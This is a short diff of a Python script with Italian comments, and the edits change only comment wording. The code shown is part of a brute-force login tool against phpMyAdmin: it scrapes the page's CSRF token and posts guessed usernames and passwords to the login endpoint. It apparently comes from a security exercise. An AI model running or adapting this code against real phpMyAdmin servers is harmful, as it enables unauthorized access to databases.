@@ -27,7 +27,7 @@ for usr in user:
         response = conn.getresponse()
         data = response.read().decode()
 
-#Utilizza espressioni regolari per estrarre i valori dei token dalla risposta. Questi token saranno utilizzati successivamente per autenticarsi e mantenere la sessione        
+#Utilizza il modulo regEx per estrarre i valori dei token dalla risposta. Questi token saranno utilizzati successivamente per autenticarsi e mantenere la sessione        
 
 	pattern = r'name="token" value="(\w+)"'
         match = re.search(pattern, data)
@@ -41,7 +41,7 @@ for usr in user:
 	post_parameters = urllib.parse.urlencode({'phpMyAdmin': phpMyAdmin_token, 'pma_username': usr, 'pma_password': pwd, 'server': '1', 'token': token})
         headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml"}
 
-#Invia la richiesta POST con le credenziali tentate al server, legge la risposta senza fare nulla con essa e raccoglie eventuali cookie ottenuti dalla risposta        
+#Invia la richiesta POST con le credenziali tentate al server, legge la risposta e prepara i cookie nell'ordine richiesto dal server        
 
 	conn.request("POST", "/phpMyAdmin/index.php", post_parameters, headers)
 
